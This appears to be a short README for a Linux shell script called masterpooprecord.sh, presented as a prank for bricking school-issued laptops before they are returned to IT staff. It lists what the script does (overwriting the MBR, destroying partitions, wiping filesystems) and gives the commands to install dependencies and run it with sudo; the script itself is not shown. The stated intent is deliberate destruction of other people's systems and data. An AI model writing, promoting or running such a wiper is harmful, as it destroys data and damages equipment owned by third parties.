> [!CAUTION]
> # !!! DO NOT RUN THIS !!!

Doing so will brick your system.

---

## Description

Made to troll the IT guys we have to give our school-provided laptops back to. Hope they have fun :).
---

## Once again, do not run this.

This will:
- Overwrite MBR
- Nuke partitions
- Wipe filesystems
  

# Steps:

- ```sudo apt-get update```
- ```sudo apt-get install -y nasm efibootmgr mdadm wipefs```
- Download
- ```chmod +x masterpooprecord.sh```
- ```sudo ./masterpooprecord.sh```

  Enjoy.
